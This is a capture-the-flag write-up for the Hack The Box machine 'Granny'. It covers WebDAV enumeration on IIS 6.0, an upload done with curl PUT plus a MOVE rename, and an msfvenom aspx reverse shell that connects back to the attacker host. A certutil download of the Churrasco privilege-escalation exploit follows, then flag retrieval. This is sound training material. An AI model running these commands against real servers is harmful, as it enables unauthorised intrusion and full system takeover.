# Granny

| Category | |
|---|---|
| OS | Windows |
| Difficulty | Easy |
| Name | Granny |
| Target IP(s) | 10.129.103.148, 10.129.78.242 (after restart) |
| Foothold | File Upload |
| PrivEsc | `Churrasco` - Microsoft Windows XP/VISTA/2003/2008 - WMI Service Isolation Local Privilege Escalation Vulnerability|
| Tech | WebDAV |
| Includes | OSCP-Prep |

 
## Service scan
Full TCP scan
```
# Nmap 7.91 scan initiated Wed Jul 14 23:48:19 2021 as: nmap -vv --stats-every 20s -p- --min-rate 10000 -oA scans/nmap-full_scan_tcp 10.129.103.148
Nmap scan report for 10.129.103.148
Host is up, received echo-reply ttl 127 (0.032s latency).
Scanned at 2021-07-14 23:48:19 EDT for 13s
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Jul 14 23:48:33 2021 -- 1 IP address (1 host up) scanned in 13.52 seconds
```

Full UDP scan
```
# Nmap 7.91 scan initiated Wed Jul 14 23:48:33 2021 as: nmap -vv --stats-every 20s -sU -p- --min-rate 10000 -oA scans/nmap-full_scan_udp 10.129.103.148
Nmap scan report for 10.129.103.148
Host is up, received echo-reply ttl 127 (0.039s latency).
All 65535 scanned ports on 10.129.103.148 are open|filtered because of 65535 no-responses

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Jul 14 23:48:46 2021 -- 1 IP address (1 host up) scanned in 13.66 seconds
```

Specific TCP port scan
```
# Nmap 7.91 scan initiated Wed Jul 14 23:49:40 2021 as: nmap -p 80 -sCV -oA scans/nmap-tcp_scripts 10.129.103.148
Nmap scan report for 10.129.103.148
Host is up (0.035s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Date: Thu, 15 Jul 2021 03:49:48 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  Server Type: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 14 23:49:49 2021 -- 1 IP address (1 host up) scanned in 8.89 seconds
```

nmap shows, `PUT` and `MOVE` are allowed to the public. To explore this further `davtest` will be used to show which types of files can be uploaded, and if it can create a directory.

```
davtest --url http://10.129.103.148 | tee scans/tcp_80_http_davtest.txt
```

Output of `davtest`:
```
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.129.103.148
********************************************************
NOTE	Random string for this session: 832eFlXD4Y6R51a
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.129.103.148/DavTestDir_832eFlXD4Y6R51a
********************************************************
 Sending test files
PUT	asp	FAIL
PUT	shtml	FAIL
PUT	pl	SUCCEED:	http://10.129.103.148/DavTestDir_832eFlXD4Y6R51a/davtest_832eFlXD4Y6R51a.pl
PUT	cfm	SUCCEED:	http://10.129.103.148/DavTestDir_832eFlXD4Y6R51a/davtest_832eFlXD4Y6R51a.cfm
PUT	php	SUCCEED:	http://10.129.103.148/DavTestDir_832eFlXD4Y6R51a/davtest_832eFlXD4Y6R51a.php
PUT	aspx	FAIL
PUT	cgi	FAIL
PUT	jsp	SUCCEED:	http://10.129.103.148/DavTestDir_832eFlXD4Y6R51a/davtest_832eFlXD4Y6R51a.jsp
PUT	html	SUCCEED:	http://10.129.103.148/DavTestDir_832eFlXD4Y6R51a/davtest_832eFlXD4Y6R51a.html
PUT	txt	SUCCEED:	http://10.129.103.148/DavTestDir_832eFlXD4Y6R51a/davtest_832eFlXD4Y6R51a.txt
PUT	jhtml	SUCCEED:	http://10.129.103.148/DavTestDir_832eFlXD4Y6R51a/davtest_832eFlXD4Y6R51a.jhtml
********************************************************
 Checking for test file execution
EXEC	pl	FAIL
EXEC	cfm	FAIL
EXEC	php	FAIL
EXEC	jsp	FAIL
EXEC	html	SUCCEED:	http://10.129.103.148/DavTestDir_832eFlXD4Y6R51a/davtest_832eFlXD4Y6R51a.html
EXEC	txt	SUCCEED:	http://10.129.103.148/DavTestDir_832eFlXD4Y6R51a/davtest_832eFlXD4Y6R51a.txt
EXEC	jhtml	FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.129.103.148/DavTestDir_832eFlXD4Y6R51a
PUT File: http://10.129.103.148/DavTestDir_832eFlXD4Y6R51a/davtest_832eFlXD4Y6R51a.pl
PUT File: http://10.129.103.148/DavTestDir_832eFlXD4Y6R51a/davtest_832eFlXD4Y6R51a.cfm
PUT File: http://10.129.103.148/DavTestDir_832eFlXD4Y6R51a/davtest_832eFlXD4Y6R51a.php
PUT File: http://10.129.103.148/DavTestDir_832eFlXD4Y6R51a/davtest_832eFlXD4Y6R51a.jsp
PUT File: http://10.129.103.148/DavTestDir_832eFlXD4Y6R51a/davtest_832eFlXD4Y6R51a.html
PUT File: http://10.129.103.148/DavTestDir_832eFlXD4Y6R51a/davtest_832eFlXD4Y6R51a.txt
PUT File: http://10.129.103.148/DavTestDir_832eFlXD4Y6R51a/davtest_832eFlXD4Y6R51a.jhtml
Executes: http://10.129.103.148/DavTestDir_832eFlXD4Y6R51a/davtest_832eFlXD4Y6R51a.html
Executes: http://10.129.103.148/DavTestDir_832eFlXD4Y6R51a/davtest_832eFlXD4Y6R51a.txt
```

Unfortunately `aspx` files cannot be uploaded, but as files can be moved, we will try to rename them.

First test to upload a text file
```
└─$ echo test > test.txt
└─$ curl -X PUT http://10.129.103.148/test.txt -d @test.txt
└─$ curl http://10.129.103.148/test.txt
test                                                   
```

As expected, the upload of an aspx file fails
```
└─$ cp test.txt test.aspx
└─$ curl -X PUT http://10.129.103.148/test.aspx -d @test.aspx
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>The page cannot be displayed</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
<STYLE type="text/css">
  BODY { font: 8pt/12pt verdana }
  H1 { font: 13pt/15pt verdana }
  H2 { font: 8pt/12pt verdana }
  A:link { color: red }
  A:visited { color: maroon }
</STYLE>
</HEAD><BODY><TABLE width=500 border=0 cellspacing=10><TR><TD>

<h1>The page cannot be displayed</h1>
You have attempted to execute a CGI, ISAPI, or other executable program from a directory that does not allow programs to be executed.
<hr>
<p>Please try the following:</p>
<ul>
<li>Contact the Web site administrator if you believe this directory should allow execute access.</li>
</ul>
<h2>HTTP Error 403.1 - Forbidden: Execute access is denied.<br>Internet Information Services (IIS)</h2>
<hr>
<p>Technical Information (for support personnel)</p>
<ul>
<li>Go to <a href="http://go.microsoft.com/fwlink/?linkid=8180">Microsoft Product Support Services</a> and perform a title search for the words <b>HTTP</b> and <b>403</b>.</li>
<li>Open <b>IIS Help</b>, which is accessible in IIS Manager (inetmgr),
 and search for topics titled <b>Configuring ISAPI Extensions</b>, <b>Configuring CGI Applications</b>, <b>Securing Your Site with Web Site Permissions</b>, and <b>About Custom Error Messages</b>.</li>
<li>In the IIS Software Development Kit (SDK) or at the <a href="http://go.microsoft.com/fwlink/?LinkId=8181">MSDN Online Library</a>, search for topics titled <b>Developing ISAPI Extensions</b>, <b>ISAPI and CGI</b>, and <b>Debugging ISAPI Extensions and Filters</b>.</li>
</ul>

</TD></TR></TABLE></BODY></HTML>

```

### Move Webshell

Now I’ll use the next webdav command, MOVE. Again, I can do this with curl:

-   `-X MOVE` - use the MOVE method
-   `-H 'Destination:http://10.129.103.148/reverse.aspx'` - defines where to move to
-   `http://10.129.103.148/test.txt` - the file to move

```
curl -X MOVE -H 'Destination:http://10.129.103.148/reverse.aspx' http://10.129.103.148/test.txt
```

As this worked, we'll an `aspx` reverse shell with `mafvenom`:

```
└─$ msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.17.226 LPORT=1234 -o shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2714 bytes
Saved as: shell.aspx
                                                               
└─$ mv shell.aspx shell.txt                              
                                                               
└─$ curl -X PUT http://10.129.103.148/shell.txt --data-binary @shell.txt
                                                                           
└─$ curl -X MOVE --header 'Destination:http://10.129.103.148/shell.aspx' 'http://10.129.103.148/shell.txt'
```

At a second terminal we listen to incomming connection with `nc`, and download the reverse shell.

```
└─$ curl http://10.129.103.148/shell.aspx     
```


```
─$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.17.226] from (UNKNOWN) [10.129.103.148] 1035
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service

c:\windows\system32\inetsrv>systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790

```

We got an initial shell, and found out we have the `nt authority\network service` permission and that the host is running a `Microsoft(R) Windows(R) Server 2003, Standard Edition`.

Next we can find a writable folder in 
```
C:\WINDOWS\system32\inetsrv\ASP Compiled Templates>
```
which we will use to test a file download.

A google search how to do a privilege escalation on a Windows 2003 Server brought the following interesting links:
* https://www.notion.so/Windows-Privelege-Escalation-via-Token-Kidnapping-d40705518bf343438f9fcd8be0b2f0d3
* https://github.com/jivoi/pentest/tree/master/exploit_win
* https://github.com/Re4son/Churrasco
* https://github.com/Re4son/Churrasco/raw/master/churrasco.exe

First we download `Churrasco` and start a local web server.
```
┌──(kali㉿kali)-[~/htb]
└─$ git clone https://github.com/Re4son/Churrasco.git
Cloning into 'Churrasco'...
remote: Enumerating objects: 16, done.
remote: Total 16 (delta 0), reused 0 (delta 0), pack-reused 16
Receiving objects: 100% (16/16), 223.30 KiB | 3.06 MiB/s, done.
                                                                           
┌──(kali㉿kali)-[~/htb]
└─$ cd Churrasco 
                                                                           
┌──(kali㉿kali)-[~/htb/Churrasco]
└─$ ls
Churrasco.cpp  Churrasco.suo                                   README.md
churrasco.exe  Churrasco.vcproj                                ReadMe.txt
Churrasco.ncb  Churrasco.zip                                   stdafx.cpp
Churrasco.sln  DEFCON-18-Cerrudo-Token-Kidnapping-Revenge.pdf  stdafx.h
                                                                           
┌──(kali㉿kali)-[~/htb/Churrasco]
└─$ python3 -m http.server                                
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.78.242 - - [17/Jul/2021 00:55:03] "GET /churrasco.exe HTTP/1.0" 200 -
```

On the target machine we start the file download into the `C:\WINDOWS\system32\inetsrv\ASP Compiled Templates` folder with 
```
certutil -split -f -urlcache "http://10.10.17.226:8000/churrasco.exe"
```

After the file download, the file will be renamed and executed
```
C:\WINDOWS\system32\inetsrv\ASP Compiled Templates>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\WINDOWS\system32\inetsrv\ASP Compiled Templates

07/17/2021  07:55 AM    <DIR>          .
07/17/2021  07:55 AM    <DIR>          ..
07/17/2021  07:55 AM            31,232 Blob0_0.bin
               1 File(s)         31,232 bytes
               2 Dir(s)  18,126,819,328 bytes free

C:\WINDOWS\system32\inetsrv\ASP Compiled Templates>rename blob0_0.bin churrasco.exe
rename blob0_0.bin churrasco.exe

C:\WINDOWS\system32\inetsrv\ASP Compiled Templates>churrasco
churrasco
/churrasco/-->Usage: Churrasco.exe [-d] "command to run"
C:\WINDOWS\TEMP

C:\WINDOWS\system32\inetsrv\ASP Compiled Templates>whoami
whoami
nt authority\network service

C:\WINDOWS\system32\inetsrv\ASP Compiled Templates>churrasco.exe "whoami"
churrasco.exe "whoami"
nt authority\system

C:\WINDOWS\system32\inetsrv\ASP Compiled Templates>churrasco.exe "cmd"
churrasco.exe "cmd"
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami

C:\WINDOWS\system32\inetsrv\ASP Compiled Templates>
```

We can see, that `churrasco` will run commands as `nt authority\system` user. So we can start an admin shell with `churrasco.exe "cmd"`.

Afterwards it is pretty simple to get the admin and user flags.
```
C:\WINDOWS\TEMP>cd c:\documents and settings
cd c:\documents and settings

C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Documents and Settings

04/12/2017  10:19 PM    <DIR>          .
04/12/2017  10:19 PM    <DIR>          ..
04/12/2017  09:48 PM    <DIR>          Administrator
04/12/2017  05:03 PM    <DIR>          All Users
04/12/2017  10:19 PM    <DIR>          Lakis
               0 File(s)              0 bytes
               5 Dir(s)  18,125,840,384 bytes free

C:\Documents and Settings>cd administrator
cd administrator

C:\Documents and Settings\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Documents and Settings\Administrator

04/12/2017  09:48 PM    <DIR>          .
04/12/2017  09:48 PM    <DIR>          ..
04/12/2017  05:28 PM    <DIR>          Desktop
04/12/2017  05:12 PM    <DIR>          Favorites
04/12/2017  05:12 PM    <DIR>          My Documents
04/12/2017  04:42 PM    <DIR>          Start Menu
04/12/2017  04:44 PM                 0 Sti_Trace.log
               1 File(s)              0 bytes
               6 Dir(s)  18,125,840,384 bytes free

C:\Documents and Settings\Administrator>cd desktop
cd desktop

C:\Documents and Settings\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Documents and Settings\Administrator\Desktop

04/12/2017  05:28 PM    <DIR>          .
04/12/2017  05:28 PM    <DIR>          ..
04/12/2017  10:17 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  18,125,836,288 bytes free

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
aa4bee**************************
C:\Documents and Settings\Administrator\Desktop>


C:\Documents and Settings\Administrator>cd ..
cd ..

C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Documents and Settings

04/12/2017  10:19 PM    <DIR>          .
04/12/2017  10:19 PM    <DIR>          ..
04/12/2017  09:48 PM    <DIR>          Administrator
04/12/2017  05:03 PM    <DIR>          All Users
04/12/2017  10:19 PM    <DIR>          Lakis
               0 File(s)              0 bytes
               5 Dir(s)  18,125,832,192 bytes free

C:\Documents and Settings>cd Lakis
cd Lakis

C:\Documents and Settings\Lakis>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Documents and Settings\Lakis

04/12/2017  10:19 PM    <DIR>          .
04/12/2017  10:19 PM    <DIR>          ..
04/12/2017  10:19 PM    <DIR>          Desktop
04/12/2017  10:19 PM    <DIR>          Favorites
04/12/2017  10:19 PM    <DIR>          My Documents
04/12/2017  04:42 PM    <DIR>          Start Menu
04/12/2017  04:44 PM                 0 Sti_Trace.log
               1 File(s)              0 bytes
               6 Dir(s)  18,125,832,192 bytes free

C:\Documents and Settings\Lakis>cd ..
cd ..

C:\Documents and Settings>cd lakis
cd lakis

C:\Documents and Settings\Lakis>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Documents and Settings\Lakis

04/12/2017  10:19 PM    <DIR>          .
04/12/2017  10:19 PM    <DIR>          ..
04/12/2017  10:19 PM    <DIR>          Desktop
04/12/2017  10:19 PM    <DIR>          Favorites
04/12/2017  10:19 PM    <DIR>          My Documents
04/12/2017  04:42 PM    <DIR>          Start Menu
04/12/2017  04:44 PM                 0 Sti_Trace.log
               1 File(s)              0 bytes
               6 Dir(s)  18,125,824,000 bytes free

C:\Documents and Settings\Lakis>cd Desktop
cd Desktop

C:\Documents and Settings\Lakis\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Documents and Settings\Lakis\Desktop

04/12/2017  10:19 PM    <DIR>          .
04/12/2017  10:19 PM    <DIR>          ..
04/12/2017  10:20 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  18,125,799,424 bytes free

C:\Documents and Settings\Lakis\Desktop>type user.txt
type user.txt
700c5d**************************

```



Resources:
* https://0xdf.gitlab.io/2019/03/06/htb-granny.html
* https://book.hacktricks.xyz/shells/shells/untitled
* https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/granny-writeup-w-o-and-w-metasploit
* https://www.notion.so/Windows-Privelege-Escalation-via-Token-Kidnapping-d40705518bf343438f9fcd8be0b2f0d3
* https://github.com/jivoi/pentest/tree/master/exploit_win
* https://github.com/Re4son/Churrasco





